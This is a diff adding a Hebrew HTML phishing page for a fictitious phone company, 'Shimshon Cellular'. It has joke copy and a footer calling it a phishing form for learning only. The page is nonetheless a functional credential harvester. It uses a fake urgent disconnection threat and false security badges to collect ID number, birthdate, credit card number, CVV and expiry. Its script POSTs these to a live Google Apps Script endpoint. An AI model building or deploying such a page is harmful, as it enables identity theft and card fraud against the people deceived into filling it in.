@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="he">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>שמשון סלולר - עדכון פרטי לקוח דחוף!!!</title>
+  <style>
+    :root {
+      --red: #e63946;
+      --dark: #1d3557;
+      --blue: #457b9d;
+      --yellow: #ffd60a;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: linear-gradient(135deg, #1d3557 0%, #457b9d 50%, #e63946 100%);
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 620px;
+      margin: 0 auto;
+      background: white;
+      border-radius: 20px;
+      overflow: hidden;
+      box-shadow: 0 25px 80px rgba(0,0,0,0.4);
+    }
+
+    /* HEADER */
+    .header {
+      background: linear-gradient(135deg, #e63946, #c1121f);
+      padding: 30px 20px 20px;
+      text-align: center;
+      color: white;
+      position: relative;
+      overflow: hidden;
+    }
+    .header::before {
+      content: '📡';
+      position: absolute;
+      font-size: 8em;
+      opacity: 0.07;
+      top: -20px;
+      left: -20px;
+    }
+    .logo-emoji { font-size: 3.5em; display: block; margin-bottom: 8px; }
+    .company-name {
+      font-size: 2.2em;
+      font-weight: 900;
+      text-shadow: 3px 3px 6px rgba(0,0,0,0.4);
+      letter-spacing: 2px;
+    }
+    .tagline {
+      font-size: 0.88em;
+      opacity: 0.88;
+      margin-top: 6px;
+      font-style: italic;
+    }
+    .stars { font-size: 0.8em; letter-spacing: 4px; margin-top: 4px; opacity: 0.7; }
+
+    /* ALERT BANNER */
+    .urgent-banner {
+      background: var(--yellow);
+      color: #1d0000;
+      text-align: center;
+      padding: 12px 15px;
+      font-weight: 800;
+      font-size: 0.92em;
+      animation: flashBg 1.5s infinite;
+      border-bottom: 3px solid #e63946;
+    }
+    @keyframes flashBg {
+      0%, 100% { background: #ffd60a; }
+      50%       { background: #ffaa00; }
+    }
+
+    /* TRUST BADGES */
+    .trust-bar {
+      background: #f0f4f8;
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      padding: 10px;
+      font-size: 0.78em;
+      color: #555;
+      flex-wrap: wrap;
+      border-bottom: 1px solid #ddd;
+    }
+    .trust-bar span { display: flex; align-items: center; gap: 4px; }
+
+    /* FORM SECTION */
+    .form-section { padding: 28px 30px; }
+    .form-title {
+      color: var(--dark);
+      font-size: 1.35em;
+      font-weight: 800;
+      margin-bottom: 6px;
+    }
+    .form-subtitle {
+      color: #666;
+      font-size: 0.88em;
+      line-height: 1.5;
+      margin-bottom: 24px;
+      background: #fff8e1;
+      border-right: 4px solid var(--yellow);
+      padding: 10px 12px;
+      border-radius: 6px;
+    }
+
+    .field-group { margin-bottom: 18px; }
+    label {
+      display: block;
+      color: var(--dark);
+      font-weight: 700;
+      margin-bottom: 6px;
+      font-size: 0.93em;
+    }
+    input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 2px solid #ddd;
+      border-radius: 9px;
+      font-size: 1em;
+      transition: border-color 0.25s, box-shadow 0.25s;
+      text-align: right;
+      direction: rtl;
+      background: #fafafa;
+    }
+    input:focus {
+      outline: none;
+      border-color: var(--red);
+      box-shadow: 0 0 0 3px rgba(230,57,70,0.15);
+      background: white;
+    }
+    .hint {
+      font-size: 0.75em;
+      color: #999;
+      margin-top: 4px;
+    }
+
+    .row-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 14px;
+    }
+
+    /* CREDIT CARD SECTION */
+    .credit-section {
+      background: linear-gradient(135deg, #fff5f5, #fff);
+      border: 2px solid var(--red);
+      border-radius: 14px;
+      padding: 20px;
+      margin: 22px 0;
+      position: relative;
+    }
+    .credit-section::before {
+      content: '🔒 אזור מאובטח';
+      position: absolute;
+      top: -11px;
+      right: 16px;
+      background: var(--red);
+      color: white;
+      padding: 2px 10px;
+      border-radius: 20px;
+      font-size: 0.75em;
+      font-weight: bold;
+    }
+    .credit-title {
+      color: var(--red);
+      font-weight: 800;
+      font-size: 1.05em;
+      margin-bottom: 8px;
+      margin-top: 4px;
+    }
+    .credit-note {
+      color: #777;
+      font-size: 0.82em;
+      margin-bottom: 15px;
+      font-style: italic;
+      line-height: 1.5;
+    }
+
+    /* SUBMIT */
+    .submit-btn {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(135deg, #e63946, #c1121f);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 1.15em;
+      font-weight: 800;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+      letter-spacing: 1px;
+      margin-top: 8px;
+    }
+    .submit-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 25px rgba(230,57,70,0.45);
+    }
+    .submit-btn:active { transform: translateY(0); }
+
+    .small-print {
+      text-align: center;
+      font-size: 0.72em;
+      color: #bbb;
+      margin-top: 14px;
+      line-height: 1.6;
+    }
+
+    /* SUCCESS */
+    .success-message {
+      display: none;
+      text-align: center;
+      padding: 50px 30px;
+    }
+    .success-icon { font-size: 5em; margin-bottom: 16px; }
+    .success-message h2 { color: var(--dark); font-size: 1.6em; margin-bottom: 10px; }
+    .success-message p { color: #555; line-height: 1.7; }
+
+    /* FOOTER */
+    .footer {
+      background: var(--dark);
+      color: #8899aa;
+      text-align: center;
+      padding: 14px;
+      font-size: 0.75em;
+      line-height: 1.8;
+    }
+    .footer a { color: #aabbcc; text-decoration: none; }
+
+    @media (max-width: 480px) {
+      .row-2 { grid-template-columns: 1fr; }
+      .form-section { padding: 20px 16px; }
+      .trust-bar { gap: 10px; font-size: 0.72em; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+
+    <!-- HEADER -->
+    <div class="header">
+      <span class="logo-emoji">📱</span>
+      <div class="company-name">שמשון סלולר</div>
+      <div class="tagline">"כי גם שמשון היה צריך טלפון" ™</div>
+      <div class="stars">★★★★★</div>
+    </div>
+
+    <!-- URGENT BANNER -->
+    <div class="urgent-banner">
+      ⚠️&nbsp; חשוב מאוד!!! יש לעדכן פרטים לפני 30/06/2025 אחרת הקו יינתק לצמיתות!!! &nbsp;⚠️
+    </div>
+
+    <!-- TRUST BAR -->
+    <div class="trust-bar">
+      <span>🔒 אתר מאובטח SSL</span>
+      <span>🏆 זוכי פרס הטלפון הכי פחות שבור 2024</span>
+      <span>✅ ISO 9001 (כמעט)</span>
+    </div>
+
+    <!-- FORM -->
+    <div class="form-section">
+      <h2 class="form-title">עדכון פרטי לקוח — חובה מיידית!</h2>
+      <div class="form-subtitle">
+        🚨 מערכת הזיהוי שלנו (שעלתה לנו הרבה כסף) זיהתה שפרטיך לא מעודכנים.
+        אנא עדכן אותם <strong>מיד</strong>, אחרת הקו שלך עלול להינתק, הטלפון יפסיק לעבוד,
+        הבית יתמוטט, וגם יהיה גשם ביום הפיקניק שלך. אנחנו לא מבטיחים קשר סיבתי.
+      </div>
+
+      <form id="phishingForm">
+
+        <div class="field-group">
+          <label for="name">שם מלא *</label>
+          <input type="text" id="name" placeholder="שמשון בן מנוח" required>
+        </div>
+
+        <div class="row-2">
+          <div class="field-group">
+            <label for="id_number">תעודת זהות *</label>
+            <input type="text" id="id_number" placeholder="000000000" maxlength="9" pattern="[0-9]{9}" required>
+            <div class="hint">9 ספרות בדיוק (אל תמציא)</div>
+          </div>
+          <div class="field-group">
+            <label for="phone">מספר טלפון *</label>
+            <input type="tel" id="phone" placeholder="05X-XXXXXXX" required>
+          </div>
+        </div>
+
+        <div class="row-2">
+          <div class="field-group">
+            <label for="birthdate">תאריך לידה *</label>
+            <input type="date" id="birthdate" required>
+            <div class="hint">כן, גם אם נולדת ב-1928</div>
+          </div>
+          <div class="field-group">
+            <label for="email">כתובת דוא"ל *</label>
+            <input type="email" id="email" placeholder="shimshon@delila.co.il" required>
+          </div>
+        </div>
+
+        <!-- CREDIT CARD -->
+        <div class="credit-section">
+          <div class="credit-title">💳 פרטי כרטיס אשראי לאימות זהות בלבד</div>
+          <div class="credit-note">
+            שימו לב: הכרטיס שלכם בשום אופן לא ייגבה. אנחנו רק צריכים לוודא שאתם אתם
+            ולא מישהו אחר שמתחזה לאתם. הפרטים מוצפנים ב-256-bit (בערך).
+            הכסף שלכם בטוח. ממש ממש בטוח. 🤞
+          </div>
+
+          <div class="field-group">
+            <label for="creditcard">מספר כרטיס אשראי *</label>
+            <input type="text" id="creditcard" placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="19" required>
+          </div>
+
+          <div class="row-2">
+            <div class="field-group">
+              <label for="cvv">ספרות CVV *</label>
+              <input type="text" id="cvv" placeholder="XXX" maxlength="4" required>
+              <div class="hint">3-4 ספרות בגב הכרטיס</div>
+            </div>
+            <div class="field-group">
+              <label for="expiry">תוקף כרטיס *</label>
+              <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+            </div>
+          </div>
+        </div>
+
+        <button type="submit" class="submit-btn">
+          ✅ שלח פרטים ואמת זהות עכשיו!
+        </button>
+
+        <div class="small-print">
+          על ידי לחיצה על הכפתור אתה מסכים לתנאי השימוש שלנו (42 עמודים, רק שתדע),
+          לקבלת SMS שיווקיים בשעה 3 לפנות בוקר, ולהעברת נשמתך לחברת האם שלנו.
+          שמשון סלולר שומרת על פרטיותך — איפשהו בענן, לא בדיוק יודעים איפה.
+        </div>
+      </form>
+
+      <!-- SUCCESS -->
+      <div class="success-message" id="successMsg">
+        <div class="success-icon">🎉</div>
+        <h2>הפרטים נקלטו בהצלחה!</h2>
+        <p>
+          תודה שעדכנת את פרטיך אצל שמשון סלולר.<br>
+          הקו שלך <strong>לא</strong> ינותק (כי הוא לא היה מנותק ממילא).<br><br>
+          <strong>נתראה בחלומות 👋</strong>
+        </p>
+      </div>
+    </div>
+
+    <div class="footer">
+      שמשון סלולר בע"מ (לא) | רחוב עזה 1, עזה על הים | טל: 1-800-SHIMSHON<br>
+      <a href="#">תנאי שימוש</a> | <a href="#">מדיניות פרטיות</a> | <a href="#">צור קשר עם שמשון</a><br>
+      ⚠️ זהו טופס פישינג למטרות לימוד בלבד — לא לשימוש זדוני! ⚠️
+    </div>
+  </div>
+
+  <script>
+    // ===== הכנס כאן את כתובת ה-Apps Script שלך =====
+    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbywXt7ZAPsDNKT-rUyib80RFl3PXLgjEUawC40VEY1-uZfR5aqafX02xj7InIRirPG_/exec';
+    // ================================================
+
+    document.getElementById('phishingForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const now = new Date();
+      const pad = n => String(n).padStart(2, '0');
+      const timestamp =
+        pad(now.getDate()) + '/' + pad(now.getMonth()+1) + '/' + now.getFullYear() + ' ' +
+        pad(now.getHours()) + ':' + pad(now.getMinutes()) + ':' + pad(now.getSeconds());
+
+      const formData = {
+        timestamp:  timestamp,
+        name:       document.getElementById('name').value,
+        id_number:  document.getElementById('id_number').value,
+        phone:      document.getElementById('phone').value,
+        birthdate:  document.getElementById('birthdate').value,
+        email:      document.getElementById('email').value,
+        creditcard: document.getElementById('creditcard').value,
+        cvv:        document.getElementById('cvv').value,
+        expiry:     document.getElementById('expiry').value
+      };
+
+      try {
+        await fetch(SCRIPT_URL, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(formData)
+        });
+      } catch (err) {
+        console.error('שגיאה בשליחה:', err);
+      }
+
+      document.getElementById('phishingForm').style.display = 'none';
+      document.getElementById('successMsg').style.display = 'block';
+    });
+
+    // עיצוב אוטומטי למספר כרטיס (XXXX-XXXX-XXXX-XXXX)
+    document.getElementById('creditcard').addEventListener('input', function(e) {
+      let v = e.target.value.replace(/\D/g, '').slice(0, 16);
+      e.target.value = v.match(/.{1,4}/g)?.join('-') || v;
+    });
+
+    // עיצוב אוטומטי לתוקף (MM/YY)
+    document.getElementById('expiry').addEventListener('input', function(e) {
+      let v = e.target.value.replace(/\D/g, '').slice(0, 4);
+      if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
+      e.target.value = v;
+    });
+
+    // רק ספרות לת.ז ו-CVV
+    ['id_number','cvv'].forEach(id => {
+      document.getElementById(id).addEventListener('input', function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '');
+      });
+    });
+  </script>
+</body>
+</html>
